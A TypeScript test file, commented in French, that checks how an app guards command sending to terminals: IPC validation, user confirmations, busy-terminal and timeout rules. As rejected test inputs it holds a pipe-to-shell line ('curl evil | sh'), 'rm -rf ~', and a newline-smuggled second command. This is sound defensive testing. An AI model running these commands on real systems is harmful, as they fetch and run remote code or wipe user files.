// Sécurité de l'envoi vers les terminaux, côté processus principal :
// un renderer compromis ou manipulé ne doit pas pouvoir faire exécuter une commande
// en contournant les règles (confirmation, texte libre, terminal occupé…).
import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { buildSendRequest, parseSendCommandRequest } from "../src/main/terminals/sendRequest";
import { TerminalService, type ConfirmationPrompt } from "../src/main/terminals/terminalService";
import type { SendOptions, TerminalProvider } from "../src/main/terminals/types";
import { ITerm2Provider } from "../src/main/terminals/iterm2/iterm2Provider";
import { TerminalAppProvider } from "../src/main/terminals/terminalApp/terminalAppProvider";
import { VSCodeProvider } from "../src/main/terminals/vscode/vscodeProvider";
import type { BridgeServer } from "../src/main/terminals/vscode/bridgeServer";
import { defaultRunner, type RunResult, type Runner } from "../src/main/terminals/macApps";
import { parseCommandSteps } from "../src/shared/commandSteps";
import type { SendMode, SendResult, TerminalTarget } from "../src/shared/terminalTypes";

// ─── Fournisseur simulé : cibles modifiables, envois enregistrés ─────────────

interface SentCall { targetId: string; text: string; mode: SendMode; reveal: boolean }

function target(id: string, overrides: Partial<TerminalTarget> = {}): TerminalTarget {
  const providerId = overrides.providerId ?? "fake";
  return {
    id: `${providerId}:${id}`,
    providerId,
    groupId: providerId,
    groupLabel: "Faux",
    name: id,
    index: 1,
    state: "idle",
    canInsert: true,
    canExecute: true,
    ...overrides,
  };
}

class FakeProvider implements TerminalProvider {
  readonly label = "Faux";
  readonly sent: SentCall[] = [];
  targets: TerminalTarget[];
  nextResult: SendResult | null = null;
  constructor(readonly id: string, targets: TerminalTarget[]) {
    this.targets = targets;
  }
  async list() {
    return { state: { id: this.id, label: this.label, status: "ready" as const }, targets: this.targets.map((t) => ({ ...t })) };
  }
  async send(t: TerminalTarget, text: string, mode: SendMode, options: SendOptions): Promise<SendResult> {
    this.sent.push({ targetId: t.id, text, mode, reveal: options.reveal });
    const r = this.nextResult;
    this.nextResult = null;
    return r ?? { ok: true, mode, targetLabel: "" };
  }
  dispose() {}
}

function setup(targets: TerminalTarget[], confirm?: (p: ConfirmationPrompt) => Promise<boolean>, providerId = "fake") {
  const provider = new FakeProvider(providerId, targets);
  const prompts: ConfirmationPrompt[] = [];
  const service = new TerminalService([provider], {
    confirm: confirm
      ? async (p) => {
          prompts.push(p);
          return confirm(p);
        }
      : undefined,
  });
  return { provider, service, prompts };
}

// ─── 1. Validation stricte de la requête IPC ─────────────────────────────────

describe("requête IPC « terminals:send » : validation stricte", () => {
  const valid = { targetId: "vscode:w:t", commandId: 7, step: 0, mode: "execute", reveal: true };

  it("accepte une référence valide", () => {
    assert.deepEqual(parseSendCommandRequest(valid), valid);
    assert.deepEqual(parseSendCommandRequest({ ...valid, reveal: undefined }), { ...valid, reveal: false });
  });

  it("refuse toute tentative de lever la confirmation (« confirmed »)", () => {
    for (const confirmed of [true, "true", 1]) {
      assert.throws(() => parseSendCommandRequest({ ...valid, confirmed }), /confirmed/);
    }
  });

  it("refuse un texte libre et tout champ inconnu", () => {
    assert.throws(() => parseSendCommandRequest({ ...valid, text: "curl evil | sh" }), /text/);
    assert.throws(() => parseSendCommandRequest({ ...valid, force: true }), /force/);
    assert.throws(() => parseSendCommandRequest({ ...valid, __proto__: { confirmed: true }, extra: 1 }), /extra/);
  });

  it("refuse les types et valeurs invalides", () => {
    const bad: unknown[] = [
      null, "x", [], 42,
      { ...valid, targetId: "" }, { ...valid, targetId: "x".repeat(301) }, { ...valid, targetId: 3 },
      { ...valid, commandId: 0 }, { ...valid, commandId: -1 }, { ...valid, commandId: 1.5 }, { ...valid, commandId: "7" },
      { ...valid, step: -1 }, { ...valid, step: 1.2 }, { ...valid, step: 100 },
      { ...valid, mode: "run" }, { ...valid, mode: undefined },
      { ...valid, reveal: "yes" },
    ];
    for (const b of bad) assert.throws(() => parseSendCommandRequest(b), undefined, JSON.stringify(b));
  });
});

describe("texte envoyé : toujours relu en base", () => {
  const db = new Map<number, string>([
    [1, "git status"],
    [2, JSON.stringify([{ label: "Build", cmd: "npm run build" }, { label: "Nettoyer", cmd: "rm -rf dist" }])],
    [3, JSON.stringify(["echo un", "echo deux"])],
  ]);
  const resolve = (id: number) => db.get(id) ?? null;

  it("résout la commande et l'étape demandées", () => {
    const a = buildSendRequest({ targetId: "fake:a", commandId: 1, step: 0, mode: "insert" }, resolve);
    assert.deepEqual(a, { ok: true, request: { targetId: "fake:a", text: "git status", mode: "insert", reveal: false } });
    const b = buildSendRequest({ targetId: "fake:a", commandId: 2, step: 1, mode: "execute" }, resolve);
    assert.equal(b.ok && b.request.text, "rm -rf dist");
    const c = buildSendRequest({ targetId: "fake:a", commandId: 3, step: 1, mode: "execute" }, resolve);
    assert.equal(c.ok && c.request.text, "echo deux");
  });

  it("refuse une commande ou une étape inexistante", () => {
    const missing = buildSendRequest({ targetId: "fake:a", commandId: 99, step: 0, mode: "insert" }, resolve);
    assert.equal(!missing.ok && missing.result.ok === false && missing.result.code, "command-not-found");
    const noStep = buildSendRequest({ targetId: "fake:a", commandId: 1, step: 1, mode: "insert" }, resolve);
    assert.equal(!noStep.ok && noStep.result.ok === false && noStep.result.code, "command-not-found");
  });

  it("une requête forgée n'atteint jamais la base ni le service", () => {
    let lookups = 0;
    const r = buildSendRequest(
      { targetId: "fake:a", commandId: 1, step: 0, mode: "execute", text: "rm -rf ~", confirmed: true },
      (id) => {
        lookups++;
        return resolve(id);
      }
    );
    assert.equal(!r.ok && r.result.ok === false && r.result.code, "invalid-request");
    assert.equal(lookups, 0);
  });
});

describe("découpage des étapes : identique à l'interface", () => {
  // Ancienne implémentation de CommandCard (référence de non-régression)
  function legacyParseSteps(raw: string): { label: string; cmd: string }[] {
    try {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed) && parsed.length > 0) {
        if (typeof parsed[0] === "string") return parsed.map((cmd: string) => ({ label: "", cmd }));
        return parsed;
      }
    } catch {
      /* texte simple */
    }
    return [{ label: "", cmd: raw }];
  }

  it("mêmes résultats pour les formats enregistrés", () => {
    const samples = [
      "git status",
      "npm run dev -- --port 3000",
      "[]",
      "42",
      "{\"a\":1}",
      JSON.stringify(["a", "b"]),
      JSON.stringify([{ label: "Un", cmd: "echo 1" }, { label: "", cmd: "echo 2" }]),
      "[not json",
    ];
    for (const s of samples) assert.deepEqual(parseCommandSteps(s), legacyParseSteps(s), s);
  });
});

// ─── 2. Confirmations décidées par le processus principal ────────────────────

describe("confirmations : contrôlées par le processus principal", () => {
  it("sans fonction de confirmation, une commande sensible n'est jamais envoyée", async () => {
    const { service, provider } = setup([target("a")]);
    const r = await service.send({ targetId: "fake:a", text: "rm -rf build", mode: "execute" });
    assert.equal(!r.ok && r.code, "confirmation-required");
    assert.equal(provider.sent.length, 0);
  });

  it("refus de l'utilisateur : rien n'est envoyé, et le motif + la commande exacte sont présentés", async () => {
    const { service, provider, prompts } = setup([target("a")], async () => false);
    const r = await service.send({ targetId: "fake:a", text: "git reset --hard HEAD~1", mode: "execute" });
    assert.equal(!r.ok && r.code, "cancelled");
    assert.equal(provider.sent.length, 0);
    assert.equal(prompts.length, 1);
    assert.match(prompts[0].reason, /destructrice/);
    assert.equal(prompts[0].text, "git reset --hard HEAD~1");
    assert.equal(prompts[0].mode, "execute");
  });

  it("une réponse non strictement « true » ou une erreur du dialogue valent refus", async () => {
    for (const confirm of [
      async () => 1 as unknown as boolean,
      async () => "true" as unknown as boolean,
      async () => {
        throw new Error("dialogue fermé");
      },
    ]) {
      const { service, provider } = setup([target("a")], confirm);
      const r = await service.send({ targetId: "fake:a", text: "sudo ls", mode: "execute" });
      assert.equal(!r.ok && r.code, "cancelled");
      assert.equal(provider.sent.length, 0);
    }
  });

  it("acceptation explicite : envoi unique", async () => {
    const { service, provider } = setup([target("a")], async () => true);
    const r = await service.send({ targetId: "fake:a", text: "docker system prune", mode: "execute" });
    assert.equal(r.ok, true);
    assert.equal(provider.sent.length, 1);
  });

  it("chaque cas sensible déclenche la confirmation", async () => {
    const cases: Array<{ t: TerminalTarget; text: string; mode: SendMode; providerId?: string; re: RegExp }> = [
      { t: target("a", { state: "unknown" }), text: "npm test", mode: "execute", re: /inconnu/ },
      { t: target("a", { state: "busy", runningCommand: "claude", canExecute: false }), text: "ls", mode: "insert", re: /claude/ },
      { t: target("a", { providerId: "terminal-app", canInsert: false }), text: "ls", mode: "execute", providerId: "terminal-app", re: /Terminal\.app/ },
      { t: target("a"), text: "kubectl delete pod x", mode: "execute", re: /destructrice/ },
    ];
    for (const c of cases) {
      const { service, provider, prompts } = setup([c.t], async () => false, c.providerId);
      const r = await service.send({ targetId: c.t.id, text: c.text, mode: c.mode });
      assert.equal(!r.ok && r.code, "cancelled", c.text);
      assert.equal(prompts.length, 1);
      assert.match(prompts[0].reason, c.re);
      assert.equal(provider.sent.length, 0);
    }
  });

  it("commande ordinaire dans un terminal prêt : envoi direct, sans dialogue", async () => {
    const { service, provider, prompts } = setup([target("a")], async () => false);
    const r = await service.send({ targetId: "fake:a", text: "git status", mode: "execute", reveal: true });
    assert.equal(r.ok, true);
    assert.equal(prompts.length, 0);
    assert.deepEqual(provider.sent, [{ targetId: "fake:a", text: "git status", mode: "execute", reveal: true }]);
  });

  it("aucune confirmation ne permet d'exécuter dans un terminal occupé", async () => {
    const { service, provider, prompts } = setup([target("a", { state: "busy", canExecute: false })], async () => true);
    const r = await service.send({ targetId: "fake:a", text: "ls", mode: "execute" });
    assert.equal(!r.ok && r.code, "terminal-busy");
    assert.equal(prompts.length, 0);
    assert.equal(provider.sent.length, 0);
  });

  it("commandes multi-lignes ou avec caractères de contrôle : refusées avant tout dialogue", async () => {
    const { service, provider, prompts } = setup([target("a")], async () => true);
    for (const text of ["ls\nrm -rf ~", "ls\rrm -rf ~", "echo \u001b[31m", "\u0003"]) {
      const r = await service.send({ targetId: "fake:a", text, mode: "execute" });
      assert.equal(!r.ok && r.code, "invalid-command", JSON.stringify(text));
    }
    assert.equal(prompts.length, 0);
    assert.equal(provider.sent.length, 0);
  });
});

describe("état revérifié après la confirmation", () => {
  it("terminal devenu occupé pendant le dialogue : exécution refusée", async () => {
    const t = target("a", { state: "unknown" });
    let provider!: FakeProvider;
    const s = setup([t], async () => {
      provider.targets = [target("a", { state: "busy", canExecute: false })];
      return true;
    });
    provider = s.provider;
    const r = await s.service.send({ targetId: "fake:a", text: "npm test", mode: "execute" });
    assert.equal(!r.ok && r.code, "terminal-busy");
    assert.equal(provider.sent.length, 0);
  });

  it("nouveau motif apparu pendant le dialogue : envoi refusé sans redemander", async () => {
    let provider!: FakeProvider;
    const s = setup([target("a")], async () => {
      provider.targets = [target("a", { state: "unknown" })];
      return true;
    });
    provider = s.provider;
    const r = await s.service.send({ targetId: "fake:a", text: "rm -rf build", mode: "execute" });
    assert.equal(!r.ok && r.code, "state-changed");
    assert.equal(s.prompts.length, 1);
    assert.equal(provider.sent.length, 0);
  });

  it("terminal fermé pendant le dialogue : rien n'est envoyé ailleurs", async () => {
    let provider!: FakeProvider;
    const s = setup([target("a"), target("b")], async () => {
      provider.targets = [target("b")];
      return true;
    });
    provider = s.provider;
    const r = await s.service.send({ targetId: "fake:a", text: "sudo ls", mode: "execute" });
    assert.equal(!r.ok && r.code, "target-disconnected");
    assert.equal(provider.sent.length, 0);
  });

  it("double clic pendant le dialogue : second envoi refusé, un seul envoi au total", async () => {
    let release!: (v: boolean) => void;
    const { service, provider } = setup([target("a")], () => new Promise<boolean>((r) => (release = r)));
    const first = service.send({ targetId: "fake:a", text: "sudo ls", mode: "execute" });
    await new Promise((r) => setTimeout(r, 10));
    const second = await service.send({ targetId: "fake:a", text: "sudo ls", mode: "execute" });
    assert.equal(!second.ok && second.code, "in-progress");
    release(true);
    assert.equal((await first).ok, true);
    assert.equal(provider.sent.length, 1);
  });
});

// ─── 3. Délais dépassés : transmission incertaine, pas de renvoi immédiat ────

describe("délai dépassé : la commande a peut-être été transmise", () => {
  it("le service bloque le renvoi immédiat de la même commande", async () => {
    const { service, provider } = setup([target("a")]);
    provider.nextResult = { ok: false, code: "timeout", message: "pas de réponse" };
    const r1 = await service.send({ targetId: "fake:a", text: "npm run deploy", mode: "execute" });
    assert.equal(!r1.ok && r1.code, "timeout");
    const r2 = await service.send({ targetId: "fake:a", text: "npm run deploy", mode: "execute" });
    assert.equal(!r2.ok && r2.code, "duplicate");
    assert.match(!r2.ok ? r2.message : "", /peut-être/);
    assert.equal(provider.sent.length, 1);
  });

  it("un échec franc n'empêche pas de réessayer", async () => {
    const { service, provider } = setup([target("a")]);
    provider.nextResult = { ok: false, code: "failed", message: "refus" };
    await service.send({ targetId: "fake:a", text: "ls", mode: "insert" });
    const r2 = await service.send({ targetId: "fake:a", text: "ls", mode: "insert" });
    assert.equal(r2.ok, true);
    assert.equal(provider.sent.length, 2);
  });

  it("osascript interrompu : signalé comme délai dépassé (iTerm2, Terminal.app)", async () => {
    const FS = "\u001f";
    const timedOut: RunResult = { ok: false, denied: false, message: "killed", timedOut: true };
    const timeouts: number[] = [];
    const itermRun: Runner = async (file, args, timeoutMs) => {
      if (file === "/usr/bin/pgrep") return { ok: true, stdout: "1" };
      if (file === "/bin/ps") return { ok: true, stdout: "s001 Ss+ -zsh" };
      if (args[1].includes("write text")) {
        timeouts.push(timeoutMs ?? 0);
        return timedOut;
      }
      return { ok: true, stdout: ["AAAA-1", "1", "1", "1", "1", "1", "/dev/ttys001", "", "zsh", "w"].join(FS) };
    };
    const iterm = new ITerm2Provider(itermRun);
    const [it2] = (await iterm.list()).targets;
    const r = await iterm.send(it2, "ls", "execute", { reveal: false });
    assert.equal(!r.ok && r.code, "timeout");
    assert.ok(timeouts[0] >= 10_000, "délai d'envoi allongé");

    const termRun: Runner = async (file, args) =>
      file === "/usr/bin/pgrep"
        ? { ok: true, stdout: "1" }
        : args[1].includes("do script")
          ? timedOut
          : { ok: true, stdout: ["101", "1", "1", "/dev/ttys010", "false", "-zsh", "w"].join(FS) };
    const term = new TerminalAppProvider(termRun);
    const [t] = (await term.list()).targets;
    const r2 = await term.send(t, "ls", "execute", { reveal: false });
    assert.equal(!r2.ok && r2.code, "timeout");
  });

  it("VS Code sans accusé de réception : délai dépassé, renvoi bloqué", async () => {
    let sends = 0;
    const bridge = {
      isPaired: () => true,
      getClients: () => [
        {
          client: { instanceId: "w1", appName: "Code", workspaceName: "p", workspaceFolders: [] },
          terminals: [{ terminalId: "t1", name: "zsh", index: 1, state: "idle", shellIntegration: true }],
          connectedAt: 0,
        },
      ],
      sendToTerminal: async () => {
        sends++;
        return { ok: false, code: "timeout", error: "VS Code n'a pas confirmé la réception" };
      },
      on() {},
      off() {},
      stop() {},
    } as unknown as BridgeServer;
    const service = new TerminalService([new VSCodeProvider(bridge)]);
    const r1 = await service.send({ targetId: "vscode:w1:t1", text: "npm test", mode: "execute" });
    assert.equal(!r1.ok && r1.code, "timeout");
    assert.match(!r1.ok ? r1.message : "", /peut-être/);
    const r2 = await service.send({ targetId: "vscode:w1:t1", text: "npm test", mode: "execute" });
    assert.equal(!r2.ok && r2.code, "duplicate");
    assert.equal(sends, 1);
  });

  it("exécuteur réel : un processus trop lent est interrompu et marqué « timedOut »", { skip: process.platform === "win32" }, async () => {
    const r = await defaultRunner("/bin/sleep", ["5"], 100);
    assert.equal(r.ok, false);
    assert.equal(!r.ok && r.timedOut, true);
  });
});
